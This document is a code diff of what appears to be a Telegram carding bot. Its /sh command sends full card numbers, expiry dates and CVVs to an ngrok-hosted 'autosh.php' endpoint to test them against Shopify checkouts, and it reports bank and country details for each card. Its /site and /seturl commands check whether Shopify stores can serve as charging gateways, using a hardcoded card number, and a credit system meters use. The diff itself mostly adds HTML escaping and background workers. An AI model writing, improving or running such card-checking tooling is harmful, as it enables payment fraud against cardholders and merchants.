@@ -2495,15 +2495,17 @@ async def get_bin_details(bin_number: str) -> dict:
 
 
 # --- Background /sh processing ---
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
 import aiohttp
 import json
 import asyncio
 import logging
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+from html import escape
 
 logger = logging.getLogger(__name__)
+
 
 async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     try:
@@ -2524,6 +2526,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             return
 
         cc, mm, yy, cvv = [p.strip() for p in parts]
+        full_card = f"{cc}|{mm}|{yy}|{cvv}"
 
         # --- API URL ---
         api_url = (
@@ -2547,7 +2550,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             data = json.loads(api_response)
         except json.JSONDecodeError:
             await processing_msg.edit_text(
-                f"❌ Invalid response from API:\n<code>{api_response}</code>",
+                f"❌ Invalid response from API:\n<code>{escape(api_response)}</code>",
                 parse_mode=ParseMode.HTML
             )
             return
@@ -2559,7 +2562,6 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- Extract API fields ---
         response = data.get("Response", "Unknown")
         gateway = data.get("Gateway", "Shopify")
-        card = data.get("cc", cc)
 
         # --- BIN lookup ---
         bin_number = cc[:6]
@@ -2581,17 +2583,16 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         BULLET_GROUP_LINK = "https://t.me/+pu4_ZBdp1CxiMDE1"
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-
         # --- Final formatted message ---
         formatted_msg = (
             f"═══[ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬</b> ]═══\n"
-            f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{card}</code>\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 6$💸\n"
-            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{response}</i>\n"
+            f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{escape(full_card)}</code>\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ {escape(gateway)} 6$💸\n"
+            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ <code>{brand}</code>\n"
-            f"{bullet_link} <b>𝐁𝐚𝐧𝐤</b> ➜ <code>{issuer}</code>\n"
-            f"{bullet_link} <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b> ➜ <code>{country_name} {country_flag}</code>\n"
+            f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ <code>{escape(brand)}</code>\n"
+            f"{bullet_link} <b>𝐁𝐚𝐧𝐤</b> ➜ <code>{escape(issuer)}</code>\n"
+            f"{bullet_link} <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b> ➜ <code>{escape(country_name)} {country_flag}</code>\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</b> ➜ {requester}\n"
             f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
@@ -2606,10 +2607,13 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
     except Exception as e:
         logger.exception("Error in processing /sh")
-        await update.message.reply_text(
-            f"❌ Error: <code>{str(e)}</code>",
-            parse_mode=ParseMode.HTML
-        )
+        try:
+            await update.message.reply_text(
+                f"❌ Error: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
 
 
 # --- Main /sh command ---
@@ -2637,6 +2641,7 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+
 import asyncio
 import aiohttp
 import json
@@ -2651,6 +2656,7 @@ from db import get_user, update_user, init_db
 asyncio.get_event_loop().run_until_complete(init_db())
 
 async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Telegram command: /seturl <site_url>"""
     user = update.effective_user
     user_id = user.id
 
@@ -2666,7 +2672,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not site_input.startswith(("http://", "https://")):
         site_input = f"https://{site_input}"
 
-    # --- Fetch user data ---
+    # --- Check if already set ---
     user_data = await get_user(user_id)
     if user_data.get("custom_url"):
         await update.message.reply_text(
@@ -2675,11 +2681,20 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # --- Send processing message ---
+    # --- Send initial processing message ---
     processing_msg = await update.message.reply_text(
-        f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 𝓤𝓡𝐿: <code>{escape(site_input)}</code>...",
+        f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 𝓤𝓡𝐋: <code>{escape(site_input)}</code>...",
         parse_mode=ParseMode.HTML
     )
+
+    # --- Launch background worker ---
+    asyncio.create_task(
+        process_seturl(user, user_id, site_input, processing_msg)
+    )
+
+
+async def process_seturl(user, user_id, site_input, processing_msg):
+    """Background worker that does the API call + DB update"""
 
     # --- Prepare API URL ---
     api_url = (
@@ -2694,11 +2709,11 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async with session.get(api_url, timeout=50) as resp:
                 api_response = await resp.text()
 
-        # --- Extract JSON from response using regex ---
+        # --- Extract JSON from response ---
         match = re.search(r'(\{.*\})', api_response, re.DOTALL)
         if not match:
             await processing_msg.edit_text(
-                f"❌ Could not parse API response.",
+                "❌ Could not parse API response.",
                 parse_mode=ParseMode.HTML
             )
             return
@@ -2709,10 +2724,10 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         response = data.get("Response", "Unknown")
         price = f"{data.get('Price', '1.0')}$"
 
-        # --- Update user DB safely ---
+        # --- Update user DB ---
         await update_user(user_id, custom_url=site_input)
 
-        # --- Format message ---
+        # --- Format response ---
         requester = f"@{user.username}" if user.username else str(user.id)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Deadkiller72"
@@ -2725,22 +2740,21 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if "Error" not in response else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
 
         formatted_msg = (
-                f"═══[ <b>{site_status}</b> ]═══\n"
-                f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➜ <code>{escape(site_input)}</code>\n"
-                f"{bullet_link} <b>𝐀𝐦𝐨𝐮𝐧𝐭</b> ➜ {escape(price)}💸\n"
-                f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
-                f"――――――――――――――――\n"
-                f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➜ {requester}\n"
-                f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
-                f"――――――――――――――――"
+            f"═══[ <b>{site_status}</b> ]═══\n"
+            f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➜ <code>{escape(site_input)}</code>\n"
+            f"{bullet_link} <b>𝐀𝐦𝐨𝐮𝐧𝐭</b> ➜ {escape(price)}💸\n"
+            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➜ {requester}\n"
+            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
+            f"――――――――――――――――"
         )
 
         await processing_msg.edit_text(
-                formatted_msg,
-                parse_mode=ParseMode.HTML,
-                disable_web_page_preview=True
+            formatted_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
         )
-
 
     except asyncio.TimeoutError:
         await processing_msg.edit_text(
@@ -2754,6 +2768,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
@@ -3001,13 +3016,17 @@ from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from html import escape
+from db import get_user, update_user   # make sure these are imported
 
 # Cooldown tracker
 last_site_usage = {}
 
-API_TEMPLATE = "https://edcae9ee471b.ngrok-free.app/autosh.php?cc=5547300001996183|11|2028|197&site={site_url}"
+API_TEMPLATE = (
+    "https://edcae9ee471b.ngrok-free.app/autosh.php"
+    "?cc=5547300001996183|11|2028|197&site={site_url}"
+)
 
-# Credit system
+# === Credit system ===
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
@@ -3017,6 +3036,7 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 
+# === Main command ===
 async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -3024,7 +3044,9 @@ async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # === Cooldown check ===
     now = time.time()
     if user_id in last_site_usage and (now - last_site_usage[user_id]) < 3:
-        await update.message.reply_text("⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 3 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 /𝘀𝗶𝘁𝗲 𝗮𝗴𝗮𝗶𝗻.")
+        await update.message.reply_text(
+            "⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 3 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 /𝘀𝗶𝘁𝗲 𝗮𝗴𝗮𝗶𝗻."
+        )
         return
     last_site_usage[user_id] = now
 
@@ -3037,18 +3059,17 @@ async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # === Argument check ===
     if not context.args:
         await update.message.reply_text(
-            "❌ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘜𝘙𝘓.\nExample:\n<code>/site https://example.com</code>",
+            "❌ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘜𝘙𝘓.\n"
+            "Example:\n<code>/site https://example.com</code>",
             parse_mode=ParseMode.HTML
         )
         return
 
     site_url = context.args[0].strip()
-
-    # 🔒 Ensure https:// prefix
     if not site_url.startswith(("http://", "https://")):
         site_url = "https://" + site_url
 
-    # Send initial message
+    # Initial message
     msg = await update.message.reply_text(
         f"⏳ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝒔𝒊𝒕𝒆: <code>{escape(site_url)}</code>...",
         parse_mode=ParseMode.HTML,
@@ -3059,6 +3080,7 @@ async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_site_check(site_url, msg, user))
 
 
+# === Background worker ===
 async def run_site_check(site_url: str, msg, user):
     api_url = API_TEMPLATE.format(site_url=site_url)
 
@@ -3067,56 +3089,56 @@ async def run_site_check(site_url: str, msg, user):
             async with session.get(api_url, timeout=120) as resp:
                 api_text = await resp.text()
 
-                clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
-                json_start = clean_text.find('{')
-                if json_start != -1:
-                    clean_text = clean_text[json_start:]
+        # --- Clean and parse API response ---
+        clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
+        json_start = clean_text.find('{')
+        if json_start != -1:
+            clean_text = clean_text[json_start:]
 
-                try:
-                    data = json.loads(clean_text)
-                except json.JSONDecodeError:
-                    await msg.edit_text(
-                        f"❌ Invalid API response:\n<pre>{escape(api_text)}</pre>",
-                        parse_mode=ParseMode.HTML
-                    )
-                    return
+        try:
+            data = json.loads(clean_text)
+        except json.JSONDecodeError:
+            await msg.edit_text(
+                f"❌ Invalid API response:\n<pre>{escape(api_text)}</pre>",
+                parse_mode=ParseMode.HTML
+            )
+            return
 
-                # Extract fields
-                price_float = 0.0
-                try:
-                    price_float = float(data.get("Price", 0))
-                except (ValueError, TypeError):
-                    pass
+        # Extract fields
+        try:
+            price_float = float(data.get("Price", 0))
+        except (ValueError, TypeError):
+            price_float = 0.0
 
-                price = f"{price_float}$" if price_float else "0$"
-                gateway = data.get("Gateway") or "shopify_payments"
-                status = "𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ✅" if price_float > 0 else "𝘿𝙚𝙖𝙙 ❌"
+        price = f"{price_float}$" if price_float else "0$"
+        gateway = data.get("Gateway") or "shopify_payments"
+        status = "𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ✅" if price_float > 0 else "𝘿𝙚𝙖𝙙 ❌"
 
-                requester = f"@{user.username}" if user.username else str(user.id)
-                DEVELOPER_NAME = "kคli liຖนxx"
-                DEVELOPER_LINK = "https://t.me/Deadkiller72"
-                developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
-                BULLET_GROUP_LINK = "https://t.me/+pu4_ZBdp1CxiMDE1"
-                bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
+        # Format info
+        requester = f"@{user.username}" if user.username else str(user.id)
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Deadkiller72"
+        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
+        BULLET_GROUP_LINK = "https://t.me/+pu4_ZBdp1CxiMDE1"
+        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
         formatted_msg = (
-               f"═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n\n"
-               f"{bullet_link} 𝐒𝐢𝐭𝐞       ➜ <code>{site_url}</code>\n"
-               f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮\n"
-               f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭      ➜ {price}💸\n"
-               f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬      ➜ <b>{status}</b>\n\n"
-               f"――――――――――――――――\n"
-               f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
-               f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
-               f"――――――――――――――――"
+            f"═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n\n"
+            f"{bullet_link} 𝐒𝐢𝐭𝐞       ➜ <code>{escape(site_url)}</code>\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➜ {escape(gateway)}\n"
+            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭      ➜ {price}💸\n"
+            f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬      ➜ <b>{status}</b>\n\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
+            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
+            f"――――――――――――――――"
         )
- 
+
         await msg.edit_text(
             formatted_msg,
             parse_mode=ParseMode.HTML,
             disable_web_page_preview=True
         )
-
 
     except asyncio.TimeoutError:
         await msg.edit_text(
